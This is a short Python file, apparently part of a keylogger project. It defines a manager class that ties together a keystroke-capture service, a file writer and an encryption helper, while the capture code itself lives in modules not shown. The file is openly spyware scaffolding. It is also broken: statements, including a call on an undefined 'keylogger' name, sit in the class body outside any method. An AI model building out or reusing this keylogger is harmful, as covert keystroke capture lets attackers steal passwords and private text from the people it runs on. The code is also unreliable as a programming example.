from keyloggerservise import KeyloggerService
from file_writer import FileWriter
from encrypto import Encrypt

class KeyloggerManeger:
    def __init__(self, key):

        self.keylogger = KeyloggerService()
        self.file_writer = FileWriter()
        self.encrypt = Encrypt(key)

    import time
    time.sleep(10)
    keylogger.getData()

    #def getdata(self):
     #   return self.keylogger.data

    def exit(self):
        pass